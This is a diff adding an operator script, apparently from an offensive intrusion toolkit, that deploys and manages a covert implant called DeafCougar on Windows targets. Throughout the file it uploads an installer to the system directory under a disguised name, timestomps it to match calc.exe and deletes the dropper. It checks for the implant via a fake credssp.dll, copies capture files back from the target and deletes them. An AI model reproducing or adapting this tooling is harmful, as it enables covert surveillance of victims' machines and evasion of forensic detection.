@@ -1,0 +1,248 @@
+#--------------------------------------------------------
+# File: Deafcougar.eps
+# 
+# Script to install/uninstall/collect DC
+#--------------------------------------------------------
+
+@include "_FileExists.epm";
+@include "_GenericFunctions.epm";
+@include "_RecordToolUse.epm";
+
+@echo off;
+@case-sensitive off;
+
+string $tool = "DeafCougar";
+string $version = "1.0.0.1";
+string $capture = "c_41649.nls";
+bool $usage_DEPLOYED = false;
+bool $usage_EXERCISED = false;
+bool $usage_DELETED = false;
+string $status="Successful";
+bool $temp;
+
+
+#--------------------------------------------------------
+# Get path that EP scripts are run out of
+#--------------------------------------------------------
+string $ScriptsDir;
+_GetEPScriptsPath($ScriptsDir);
+
+int $menuOption;
+string $localPath = "$ScriptsDir\\..\\..\\..\\..\\opsdisk\\tools\\deafcougar";
+string $dcUploadFile = "enumDrives_installer.exe";
+string $localInstallPath = "$localPath\\$dcUploadFile";
+string $localParsePath = "$localPath\\decodeenumDrives.exe";
+string $fileName = "chkdsk32.exe";
+
+#--------------------------------------------------------
+# Get system path
+#--------------------------------------------------------
+string $systemPath;
+ifnot (_GetSystemPath($systemPath)) {
+	return false;
+}
+
+#--------------------------------------------------------
+# Check to see if help16.exe exists on the target (shouldn't)
+#--------------------------------------------------------
+if (_FileExists ($fileName, "$systemPath")) {
+	$fileName = "winhlp16.exe";
+}
+
+echo "";
+
+
+while (true) {
+	echo "- $tool $version";
+	echo "- Capture File: $capture";
+	echo "";
+	string $somecmd = "dir c_*9.nls -path $systempath -max 0";
+	@record on;
+	ifnot(`$somecmd`){
+		echo "Could not get dir listing";
+		@record off;
+		return false;
+	}
+	@record off;
+	string $dirNames = GetCmdData("name");
+	string $dirName;
+	echo "- Output from dir c_*9.nls -path $systempath:";
+	foreach $dirName ($dirNames){
+	echo "--- $dirName ";
+	}
+	
+	# print the command list
+	echo "";
+	echo " (0). Exit";
+	echo " (1). Set Capture File";
+	echo " (2). Install";
+	echo " (3). Uninstall";
+	echo " (4). Verify Install";
+	echo " (5). Collect and Parse";
+	echo " (6). Delete Capture File";
+
+	echo "";
+	$menuOption = GetInput("Enter the desired option");
+
+	if ($menuOption == 0) {
+	#--------------------------------------------------------
+	# Quit
+	#--------------------------------------------------------
+		return true;
+
+	} else if ($menuOption == 1) {
+		echo "Current Capture File = '$capture'";
+		$capture = GetInput("Enter new capture file name");
+	} else if ($menuOption == 2) {
+		if(DcInstall($localInstallPath, $dcUploadFile, $systemPath, $fileName, "-i")) {
+			echo "success";
+			_RecordToolUse($tool,$version,"DEPLOYED","Successful");
+		}
+		else { echo "failure"; _RecordToolUse($tool,$version,"DEPLOYED","Unuccessful"); }
+	} else if ($menuOption == 3) {
+		if(DcInstall($localInstallPath, $dcUploadFile, $systemPath, $fileName, "-u")) { _RecordToolUse($tool,$version,"DELETED","Successful"); }
+		else { _RecordToolUse($tool,$version,"DELETED","Unsuccessful"); }
+	} else if ($menuOption == 4) {
+		if(DcVerify($systemPath)) { _RecordToolUse($tool,$version,"EXERCISED","Successful"); }
+		else { _RecordToolUse($tool,$version,"EXERCISED","Unsuccessful"); }
+	} else if ($menuOption == 5) {
+		ifnot(DcCollect($systemPath, $localParsePath, $capture)){
+			echo "Collection and parsing could not be completed, please finish manually";
+			_RecordToolUse($tool,$version,"EXERCISED","Unsuccessful");
+		}
+		else { _RecordToolUse($tool,$version,"EXERCISED","Successful"); }
+	} else if ($menuOption == 6){
+		if(DcClear($systemPath, $capture)) { 
+		_RecordToolUse($tool,$version,"EXERCISED","Successful"); }
+		else { _RecordToolUse($tool,$version,"EXERCISED","Unuccessful"); }
+	} else {
+	#--------------------------------------------------------
+	# Invalid menuOption
+	#--------------------------------------------------------
+		echo "*** Invalid menuOption ***";
+	}
+
+	pause;
+}
+
+
+return false;
+
+
+
+Sub DcInstall(IN string $localInstallPath, IN string $dcUploadFile, IN string $systemPath, IN string $fileName, IN string $command)
+{
+	bool $success = true;
+	#--------------------------------------------------------
+	# Install DeafCougar - upload and run with -i option
+	#--------------------------------------------------------
+	echo "Uploading $dcUploadFile to $systemPath\\$fileName";
+	ifnot(`put $localInstallPath -name "$systemPath\\$fileName"`){
+		echo "Could not put $fileName into $systemPath";
+		$success = false;
+	}else{
+		echo "Matching Times with calc.exe";
+		'matchtimes "$systemPath\\calc.exe" "$systemPath\\$fileName"';
+		echo "";
+		echo "Running $fileName on target...\n";
+		@echo on;
+		ifnot(`run -command "$systemPath\\$fileName $command" -redirect`)
+		{
+			@echo off;
+			echo "Could not run $systemPath\\$fileName $command";	
+			$success = false;
+		}
+	}
+	@echo off;
+	echo "";
+	echo "Deleting $systemPath\\$fileName";
+	ifnot(`del $fileName -path $systemPath`){
+		echo "Could not delete $systemPath\\$fileName";
+		echo "Please delete it manually";
+	}
+	return $success;
+}
+
+Sub DcVerify(IN string $systemPath)
+{
+	#--------------------------------------------------------
+	# Check to see if Deafcougar files exist
+	#--------------------------------------------------------
+	bool $logSuccessFlag = true;
+	bool $driverSuccessFlag = true;
+	bool $success = true;
+	if (_FileExists ("credssp.dll", "$systemPath")) {
+	echo "credssp.dll log file exists ... SUCCESSFUL";
+	echo "DEAFCOUGAR is on the target!";
+	} else {
+		echo "credssp.dll log file missing ... FAILED";
+		$logSuccessFlag = false;
+	}
+	return $success;
+}
+
+
+
+Sub dcCollect(IN string $systemPath, IN string $localParsePath, IN string $capture)
+{
+	bool $success = true;
+	#--------------------------------------------------------
+	# Download Deafcougar and Parse the local file
+	#--------------------------------------------------------
+	echo "Getting $systemPath\\$capture...";
+	echo "";
+	@record on;
+	ifnot(`copyget "$systemPath\\$capture"`){
+		echo "Could not copyget $systemPath\\$capture";
+		@record off;
+		return false;
+	}
+	@record off;
+	string $localName = GetCmdData("LocalName");
+
+	string $temp = split("_", $localName);
+	int $counter = 1;
+	string $fileDate = "";
+	while ($counter < sizeOf($temp)) {
+		$fileDate = "$fileDate\_$temp[$counter]";
+		$counter++;
+	}
+
+	echo "";
+
+	echo "";
+	echo "Parsing file...";
+		
+	ifnot(`local run -command "$localParsePath Get_Files\\$localName Get_Files\\DC_capture_$filedate.txt"`){
+		echo "Could not run $localParsePath -tu -i";
+		$success = false;
+	}
+	
+
+	echo "";
+	echo "";
+
+	sleep 3000;
+	@echo on;
+	`local dir *$fileDate* -path "Get_Files"`;
+	@echo off;
+	return $success;
+}
+
+Sub DcClear(IN string $systemPath, IN string $capture)
+{
+	#--------------------------------------------------------
+	# Delete Capture File
+	#--------------------------------------------------------
+	bool $success = true;
+	echo "";
+	echo "Deleting $systemPath\\$capture";
+	ifnot(`del $capture -path $systemPath`){
+		echo "Could not delete $systemPath\\$capture";
+		echo "Please delete it manually";
+		$success = false;
+	}
+	return $success;
+}
+
+
